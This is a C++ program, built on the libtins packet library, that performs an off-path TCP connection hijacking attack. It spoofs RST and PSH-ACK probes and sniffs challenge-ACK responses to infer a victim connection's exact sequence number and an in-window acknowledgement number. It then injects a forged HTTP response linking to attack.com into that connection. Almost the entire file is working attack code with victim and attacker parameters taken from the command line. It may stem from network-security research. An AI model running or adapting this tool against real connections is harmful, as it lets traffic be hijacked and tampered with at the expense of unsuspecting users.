#include <tins/tins.h>
#include <cassert>
#include <iostream>
#include <string>
#include <unistd.h>
#include <thread>


using std::thread;
using std::cout;
using std::vector;
using namespace Tins;

long current_spoof_seq;
long current_spoof_ack;
long current_min_ack;
long best_seq = 0;
long best_ack;

vector<long> possible_seqs;
vector<long> possible_acks;

int num_sent = 0;
int current_round = 1;
bool ack_search = false;
bool track_nums = false;
bool count_chacks = false;
bool sniffed_chack = false;

bool show = false;
bool testing = true; // if using netcat set to true, else false
int sniff_request = 0; // 0 = off, 1 = sniffing for request, 2 = sniffed that request

std::string victim_wlan_addr, dest_ip, remote_addr, interface;
int sport, dport, request_size, chack_count;


std::string dest_mac = "";
std::string src_mac = "";


void print_divider(int count) {
  int i = 0;
  while (i < count) {
    cout << "~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n";
    i++;
  }
}

// Injects a malicious payload with the exact seq
// and in-window ack inferred before
//
int inject_junk(long exact_seq, long in_win_ack) {

  PacketSender sender;
  NetworkInterface iface(interface);

  std::string message = "HTTP/1.1 200 OK\r\nContent-Type: text/html; charset=utf-8\r\nContent-Length: 84\r\nConnection: keep-alive\r\n\r\n<h1><a href=\"https://attack.com\">Just some junk here..</a></h1>";

  IP pkt = IP(dest_ip, remote_addr) / TCP(dport, sport) / RawPDU(message);
  TCP& tcp = pkt.rfind_pdu<TCP>();

  tcp.set_flag(TCP::PSH, 1);
  tcp.set_flag(TCP::ACK, 1);
  tcp.seq(exact_seq);
  tcp.ack_seq(in_win_ack);

  print_divider(2);
  cout << "attempting to inject garbage into the connection..\n";
  cout << "injected seq: " << exact_seq << ", in-win ack: " << in_win_ack << "\n";

  sender.send(pkt, iface);
  num_sent ++;

  return 1;

}


// Send the same probe a number of times 
// to see if the same amount of responses are 
// triggered from the client
//
bool rechack(long seq, long ack, int num_checks) {

  PacketSender sender;
  NetworkInterface iface(interface);
  count_chacks = true;

  IP pkt = IP(dest_ip, remote_addr) / TCP(dport, sport) / RawPDU("");
  TCP& tcp = pkt.rfind_pdu<TCP>();

  if (ack == 0) {
    tcp.set_flag(TCP::RST, 1);
  } else {
    tcp.set_flag(TCP::PSH, 1);
    tcp.set_flag(TCP::ACK, 1);
    tcp.ack_seq(ack);
  }


  tcp.seq(seq);
  chack_count = 0;
  int count = 0;
  usleep(1000000 / 2);

  while (count < num_checks) {
    sender.send(pkt, iface);
    num_sent ++;
    usleep(1000000 / 2 * 1.2); // must sleep half second due to chall-ack rate limit
    count ++;
  }

  usleep(1000000);

  // should have just sniffed as many chacks as we just sent
  cout << "end of rechack, count was: " << chack_count << ", should be: " << num_checks << " \n";

  if (chack_count >= num_checks) {
    return true;
  }

  count_chacks = false;

  return false;

}


// Use the fact the client will respond to empty PSH-ACKs
// that have an in window ack AND a sequence number less than the exact
// next expected sequence, with chall-acks to infer exact sequence num
//
long find_exact_seq(long in_win_seq, long in_win_ack, int send_delay) {

  PacketSender sender;
  NetworkInterface iface(interface);

  IP pkt = IP(dest_ip, remote_addr) / TCP(dport, sport) / RawPDU("");
  TCP& tcp = pkt.rfind_pdu<TCP>();

  tcp.set_flag(TCP::PSH, 1);
  tcp.set_flag(TCP::ACK, 1);
  tcp.ack_seq(in_win_ack);

  count_chacks = false;
  track_nums = false;

  long min_seq = in_win_seq - 200; // assuming the in_window_seq is within 200 of the left edge of window
  sniffed_chack = false;
  long curr_seq = in_win_seq;

  // Continually decrement the in window sequence number
  // until we sniff a chack which means we just passed the
  // left edge of the sequence window
  //
  print_divider(1);
  bool is_found = false;

  while (!is_found) {

    long j = curr_seq;
    sniffed_chack = false;

    while (j > min_seq && !sniffed_chack) {
      usleep(send_delay);
      cout << "spoofing with seq: " << j << "\n";

      tcp.seq(j);
      sender.send(pkt, iface);
      num_sent ++;
      j -= 1;
    }

    usleep(100000);
    curr_seq = best_seq;
    cout << "best seq at end of exact scan: " << curr_seq << "\n";

    print_divider(1);
    is_found = rechack(curr_seq, in_win_ack, 2);
    if (show) cout << "exact seq was in win after rechack? " << is_found << "\n";

  }

  return curr_seq;
}


// Use the fact the client will respond to empty PSH-ACKs
// that have an in window sequence number AND ack number less than the
// ack number in use with chall-acks to infer an in-window ack number
//
long find_ack_block(long max_ack, long min_ack, long in_win_seq, long block_size, int send_delay, bool verbose, int chack_trigs) {

  PacketSender sender;
  NetworkInterface iface(interface);

  // Loop over ack space sending empty push-acks
  // that use the in window sequence number found before
  //

  IP pkt = IP(dest_ip, remote_addr) / TCP(dport, sport) / RawPDU("");
  TCP& tcp = pkt.rfind_pdu<TCP>();
  tcp.set_flag(TCP::PSH, 1);
  tcp.set_flag(TCP::ACK, 1);
  tcp.seq(in_win_seq);

  sniffed_chack = false;
  chack_count = 0;
  count_chacks = true;
  track_nums = true;

  current_min_ack = min_ack;
  long j = max_ack;
  long current_ack = 0;
  best_ack = 0;


  while (j > min_ack && chack_count < chack_trigs) { 
    usleep(send_delay);

    tcp.ack_seq(j);
    sender.send(pkt, iface);
    num_sent ++;

    if (verbose && show) cout << "spoofing with ack: " << j << "\n";

    if (j < 100000000) { // for tiny ack range
      j -= block_size / 100;

    } else {
      j -= block_size;
    }
  }

  usleep(100000);


  for (int i = 0; i < possible_acks.size(); i ++) {
    long cack = possible_acks[i];
    if (cack > current_ack) current_ack = cack;

  }
  cout << "best ack at end of ack scan: " << current_ack << "\n";
  track_nums = false;

  return current_ack;
}

// Finds the "quiet" portion of the ack range to
// start scanning and then begins to find an approx
// ack block close to the one being used
//
long quack_spread(long in_win_seq) {

  cout << "starting quack spread w seq: " << in_win_seq << "\n";

  long start_ack_guess = 4294967294 / 2;
  long end_ack_guess = 100;

  long block_size = 100000000;
  sniffed_chack = false; // assume its gonna find an ack here first


  // if the actual ack is less than half of the max_ack allowed,
  // then it will consider acks at the very top end of the ack space (~429.....)
  // to be less than that small ack. therefore, we check if the max ack
  // triggers chacks right away, if so then we half the start_ack guess (~214....)


  bool triggering = rechack(in_win_seq, start_ack_guess, 3);

  cout << "is ack in upper half? " << triggering << "\n";

  if (triggering) { // then we know the ack is in the lower half of the ack space
    start_ack_guess = start_ack_guess * 2;
  }

  long j = start_ack_guess;
  sniffed_chack = false;
  print_divider(1);

  // Now continually decrement ack until we trigger another chack
  //

  int send_delay = 75000;
  bool is_found = false;
  long current_ack = 0;

  while (!is_found) {

    current_ack = find_ack_block(start_ack_guess, 0, in_win_seq, block_size, send_delay, true, 1);

    cout << "finished quiet block spread, guessed quiet block ack: " << current_ack << "\n";
    print_divider(1);

    // recheck and send multiple to make sure we found correct ack block
    is_found = rechack(in_win_seq, current_ack, 2);
    if (show) cout << "was in win after rechack? " << is_found << "\n";

    if (!is_found) start_ack_guess = current_ack;
  }


  return current_ack;
}

// Use the fact the client will respond to RSTs
// with an in-window sequence number with chall-acks to
// infer an in-window seq number
//
long find_seq_block(long prev_block_size, long new_block_size, long delay_mult, long send_delay, long top_seq) {

  PacketSender sender;
  NetworkInterface iface(interface);

  long max_seq = top_seq;
  long adder = prev_block_size * delay_mult;

  cout << "starting round " << current_round << " spread at: " << (max_seq - adder) << "\n";

  IP pkt = IP(dest_ip, remote_addr) / TCP(dport, sport);
  TCP& tcp = pkt.rfind_pdu<TCP>();
  tcp.set_flag(TCP::RST, 1);

  long i;

  for (i = (max_seq - adder); i < max_seq; i += new_block_size) {
    tcp.seq(i);
    sender.send(pkt, iface);
    num_sent ++;
    usleep(send_delay);
  }

  cout << "finished round " << current_round << " spread, guessed in window seq: " << best_seq << "\n";

  return best_seq;

}


// Attempt to sniff challenge acks while recording
// the last sequence or ack number we spoofed
//
bool handle_packet(PDU &some_pdu) {

  const IP &ip = some_pdu.rfind_pdu<IP>();

  if (ack_search) {
    // keep track of the last ack num we spoofed
    if (ip.src_addr() == remote_addr) current_spoof_ack = some_pdu.rfind_pdu<TCP>().ack_seq();

    if (ip.src_addr() == victim_wlan_addr) {

      const uint32_t& payload = some_pdu.rfind_pdu<RawPDU>().payload_size();
      //cout << payload << "\n";

      if (payload == 115) { // each triggered chall-ack is 115 length SSL 
        if (show) cout << "sniffed chack w ack: " << (current_spoof_ack) << "\n";
        if (count_chacks) chack_count += 1;
        if (track_nums) possible_acks.push_back(current_spoof_ack);
        if (current_spoof_ack > current_min_ack) best_ack = current_spoof_ack;
        sniffed_chack = true;
      }
    }

  } else if (sniff_request == 1) {
    // sniffing for a certain client request size (last step after finding seq and ack)
    if (ip.src_addr() == victim_wlan_addr) {
      const uint32_t& payload = some_pdu.rfind_pdu<RawPDU>().payload_size();
      cout << "sniffed cli request of size " << payload << "\n";
      if (payload == request_size) {
        sniff_request = 2;
      }
    }

  } else { // sniffing for chack during sequence search

    // keep track of the last sequence num we spoofed
    if (ip.src_addr() == remote_addr) current_spoof_seq = some_pdu.rfind_pdu<TCP>().seq();

    if (ip.src_addr() == victim_wlan_addr) {

      const uint32_t& payload = some_pdu.rfind_pdu<RawPDU>().payload_size();
      //cout << payload << "\n";

      if (payload == 115) { // each triggered chall-ack is 1 length15 SSL

        if (show) cout << "sniffed chack w seq: " << (current_spoof_seq) << "\n";

        if (track_nums) {
          best_seq = current_spoof_seq;
          possible_seqs.push_back(current_spoof_seq);
        } else if (count_chacks) { //
          chack_count += 1;
          best_seq = current_spoof_seq;
        } else {
          if (!sniffed_chack) {

            if (best_seq == 0) { // still in initial seq spread
              best_seq = current_spoof_seq;
              sniffed_chack = true;
            } else {
              // make sure new seq is less than the previous sniffed one
              if (current_spoof_seq < best_seq) {
                best_seq = current_spoof_seq;
                sniffed_chack = true;
              }
            }

          }
        }

      }

    }
  }

  return true;
}



void sniff_stuff() {
  SnifferConfiguration config;
  config.set_promisc_mode(true);
  Sniffer sniffer(interface, config);
  sniffer.sniff_loop(handle_packet); // call the handle function for each sniffed pack
}


// Try to find an in window sequence number using
// one of the very rough estimates found in the first
// sequence spread
long try_seq_block(long current_seq) {

  // Just did round 1 spoofing fast to get rough estimate of
  // in window sequence number, now we send a round 2 and 3 spreads
  // using the approximated seq with lower send rates

  current_round = 2;
  sniffed_chack = false;
  int wait_count = 0;
  best_seq = current_seq;
  usleep(1000000 / 2);

  // this will take into account the last block size of 50k,
  // skip in blocks of 1055 seq nums per send, assume the last
  // rounds delay was 80 packets for a response, and send every 150 msecs
  long s1 = find_seq_block(50000, 1055, 80, 150, current_seq);

  while (best_seq == current_seq) {
    usleep(500000);
    if (show) cout << "waiting on round 2 chack..\n"; // return -1 if waiting too long
    wait_count +=1;
    if (wait_count > 5) return -1;
  }

  // Now we should have a close estimate to an in-window seq
  // so next do a third scan at much slower rate to ensure its
  // an in-window sequence num
  print_divider(1);
  usleep(1000000 / 2);

  sniffed_chack = false;
  current_round += 1;
  current_seq = best_seq;
  wait_count = 0;

  long s2 = find_seq_block(1055, 20, 50, 600, current_seq); 

  while (best_seq == current_seq) {
    usleep(500000);
    if (show) cout << "waiting on round 3 chack..\n";
    wait_count +=1;
    if (wait_count > 5) return -1;
  }

  return best_seq; 

}

// Gets rough estimate of sequence number in use
// by spreading entire sequence range quickly then
// tries to find in win sequence using each
//
long find_in_win_seq() {

  PacketSender sender;
  NetworkInterface iface(interface);

  long start_seq_guess = 1;
  long max_seq_num = 4294967295;
  track_nums = true; // phase 1 is so fast it sniffs false seq nums so we try each

  cout << "spreading the connections entire sequence number range...\n";
  usleep(1000000 / 2);

  IP pkt = IP(dest_ip, remote_addr) / TCP(dport, sport);
  TCP& tcp = pkt.rfind_pdu<TCP>();
  tcp.set_flag(TCP::RST, 1);

  long i;

  for (i = start_seq_guess; i <  max_seq_num; i += 50000) { // sends to the whole sequence num space
    tcp.seq(i);
    sender.send(pkt, iface);
    num_sent ++;
    usleep(10);
  }
  usleep(1000000);
  cout << "finished round 1 spread, guessed in window seq: " << best_seq << "\n";

  track_nums = false;
  int j = 0;
  long in_win_seq = -1;

  while (j < possible_seqs.size() && in_win_seq == -1) { // try each possible seq block
    print_divider(1);
    current_round = 0;
    if (show) cout << "trying to find in window seq around " << possible_seqs[j] << "\n";
    in_win_seq = try_seq_block(possible_seqs[j]);
    j ++;
    if (show) cout << "in win seq after try? " << in_win_seq << "\n";
    usleep(1000000 / 2);
  }


  possible_seqs.clear();
  track_nums = false;

  print_divider(1);
  usleep(1000000 / 2);

  return best_seq;

}


// Send two spoof rounds while increasing the send delay and
// decreasing block size to quickly get in-win ack estimate
//
long find_in_win_ack(long in_win_seq) {

  // quack should be below current ack in use but we only rechack once first round
  ack_search = true;
  long quack = quack_spread(in_win_seq);

  // Spoof empty PSH-ACKs starting at 'quack' plus some send delay
  // until we sniff a chack and know we just went below the left
  // edge of the ack window
  usleep(1000000);
  print_divider(1);
  possible_acks.clear();

  long block_size = 10000;
  int send_delay = 500; 
  long max_ack = quack + (1 * 100000000);
  long min_ack = quack;
  long clack;

  bool is_found = false;

  while (!is_found) { // retry ack scan until we find block triggering chacks

    cout << "starting round 1 ack scan w min: " << min_ack << " and max: " << max_ack << "\n";
    clack = find_ack_block(max_ack, min_ack, in_win_seq, block_size, send_delay, false, 2);

    is_found = rechack(in_win_seq, clack, 2);
    if (show) cout << "was in win after rechack? " << is_found << "\n";
    int i = 0;

    while (!is_found && i < possible_acks.size()) {
      long some_ack = possible_acks[i];
      if (show) cout << "finished ack scan 1 w possible in window ack: " <<  some_ack << "\n";
      print_divider(1);

      is_found = rechack(in_win_seq, some_ack, 2);
      if (show) cout << "was in win after rechack? " << is_found << "\n";
      i ++;
      if (is_found) clack = some_ack;

    }
    max_ack = clack;
  }

  possible_acks.clear();
  usleep(1000);


  // clack should be an in window ack so now we have both in window
  // sequence and in window ack numbers.
  //
  ack_search = false;
  track_nums = false;

  // clack has been consistently within 40k of next ack while testing but
  // in practical use it needs to be less than the expected ack by at most
  // 20k to be accepted as a valid ack, so here we add 30k to counter our delay
  // but we could add a third ack scan to make it more accurate
  //
  long in_win_ack = clack + 30000; 
  return in_win_ack;
}


// After we've found exact seq and in-win ack, attacker waits
// for a specific request size to inject the response into
//
int wait_for_request(long exact_seq, long in_win_ack) {
  sniff_request = 1;
  int res = 0;

  while (sniff_request != 2) {
    usleep(500000);
    if (show) cout << "waiting for request of size..\n";
  }

  if(show) cout << "Sniffed request packet to respond to\n";

  res = inject_junk(exact_seq, in_win_ack);

  return res;
}

// Attempt to infer the exact sequence number
// and in-window ack in use by the connection
//
int phase_three_spread() {

  bool is_found = false;
  long in_win_seq = 0;

  // Loop until we find in window seq
  while (!is_found) {
    in_win_seq = find_in_win_seq();
    print_divider(1);

    is_found = rechack(in_win_seq, 0, 2);
    cout << "approx seq: " << in_win_seq << " was in win after rechack? " << is_found << "\n";
    if (!is_found) usleep(1000000 / 2);
  }

  // At this point we should have an in-window sequence number and
  // next step is to find an in-window ack number for the connection
  //
  usleep(1000000 / 2);

  long in_win_ack = find_in_win_ack(in_win_seq);

  cout << "scanning for exact sequence num w in-win ack: " << in_win_ack << "\n";

  long exact_seq = find_exact_seq(in_win_seq - 100, in_win_ack, 100000) + 1; // should be one less than left edge
  cout << "final exact seq guess: " << exact_seq << "\n";
  cout << "total number of packets sent: " << num_sent << "\n";
  print_divider(2);

  int res = 0;

  if (testing) { // for netcat
    res = inject_junk(exact_seq, in_win_ack);
  } else { // for normal http injection
    cout << "waiting for client to request any page within inferred connection...";
    res = wait_for_request(exact_seq, in_win_ack);
  }

  return res;

}


int main(int argc, char** argv) {

  if (argc != 8) {
    cout << "sike wrong number of args ---> (remote_ip, sport, victim_pub_ip, vpn_ip, dport, request_size, iface)\n";
    return 0;
  }

  remote_addr = argv[1];
  sport = atoi(argv[2]);
  victim_wlan_addr = argv[3];
  dest_ip = argv[4];
  //dest_mac = argv[5];
  dport = atoi(argv[5]);
  request_size = atoi(argv[6]);
  interface = argv[7];
  thread sniff_thread(sniff_stuff);
  print_divider(2);

  int r = phase_three_spread();

  sniff_thread.detach();

  return 0;
}
